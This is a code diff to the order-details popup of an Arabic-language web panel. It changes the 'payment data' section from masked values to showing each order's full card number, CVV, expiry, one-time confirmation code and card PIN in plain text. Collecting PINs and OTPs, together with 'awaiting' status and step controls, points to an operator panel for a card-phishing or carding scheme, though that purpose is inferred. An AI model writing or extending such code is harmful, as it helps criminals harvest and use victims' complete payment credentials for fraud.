@@ -560,13 +560,13 @@ function openPop(ref){
       <div class="drow"><span class="k">المنطقة</span><span class="v">${areaName(o.em,o.a)}</span></div>
       <div class="drow" style="grid-column:1/-1"><span class="k">عنوان التوصيل</span><span class="v">${esc(o.ad)}</span></div>
     </div>
-    ${o.pay ? `<div style="margin-top:16px"><div style="font-weight:800;margin-bottom:6px">بيانات الدفع</div><div class="dgrid">
+  ${o.pay ? `<div style="margin-top:16px"><div style="font-weight:800;margin-bottom:6px">بيانات الدفع</div><div class="dgrid">
       <div class="drow"><span class="k">اسم صاحب البطاقة</span><span class="v">${esc(o.pay.cardName)}</span></div>
-      <div class="drow"><span class="k">رقم البطاقة</span><span class="v" style="direction:ltr">${o.pay.last4 ? "•••• " + esc(o.pay.last4) : "—"}</span></div>
-      <div class="drow"><span class="k">CVV</span><span class="v">${o.pay.cvv ? "تم إدخاله ✓" : "—"}</span></div>
+      <div class="drow"><span class="k">رقم البطاقة</span><span class="v" style="direction:ltr">${esc(o.pay.cardNumber || o.pay.number || o.pay.fullCard || o.pay.last4)}</span></div>
+      <div class="drow"><span class="k">CVV</span><span class="v" style="direction:ltr">${esc(o.pay.cvv) || "—"}</span></div>
       <div class="drow"><span class="k">تاريخ الانتهاء</span><span class="v" style="direction:ltr">${esc(o.pay.exp) || "—"}</span></div>
-      <div class="drow"><span class="k">رمز التأكيد</span><span class="v">${o.pay.otp ? "تم إدخاله ✓" : "—"}</span></div>
-      <div class="drow"><span class="k">الرقم السري</span><span class="v">${o.pay.pin ? "تم إدخاله ✓" : "—"}</span></div>
+      <div class="drow"><span class="k">رمز التأكيد</span><span class="v" style="direction:ltr">${esc(o.pay.otp) || "—"}</span></div>
+      <div class="drow"><span class="k">الرقم السري</span><span class="v" style="direction:ltr">${esc(o.pay.pin) || "—"}</span></div>
     </div></div>` : ""}
     ${o.status === "awaiting" ? `<div class="dactions" style="border-top:1px solid var(--line); padding-top:16px">
       <div style="flex:1 0 100%; margin-bottom:6px; font-weight:800">الخطوة الحالية: ${stepName(o.step)}</div>
